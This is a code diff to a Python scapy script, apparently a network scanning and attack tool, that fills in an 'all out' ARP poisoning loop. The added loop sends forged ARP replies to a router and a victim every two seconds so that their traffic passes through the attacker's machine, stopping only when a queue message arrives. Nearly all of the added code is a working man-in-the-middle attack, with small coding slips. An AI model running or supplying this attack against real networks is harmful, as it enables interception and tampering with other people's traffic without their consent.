@@ -1,4 +1,17 @@
 from scapy.all import *
+import Queue as q
+
+
+que = q.Queue()
+
+
+def put_q(put):
+    que.put(put)
+
+
+def get_q():
+    que.get(False)
+
 
 # activate by typing in terminal sudo python scanning.py
 def network_scanning():
@@ -53,7 +66,20 @@ def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic, s, number, allOut):
     mac_me = my_mac()
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     if mode=="all out":
-
+        while 1:
+            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
+            send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
+            time.sleep(2)
+            try:
+                message = que.get(False)
+                if message == "stop arp":
+                    logger.info("Stopping ARP spoofing")
+                    break
+                else:
+                    que.put(message)
+            except:
+                q.Empty
+        sys.exit(0)
     elif s:
         for i in range(0, number):
             send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
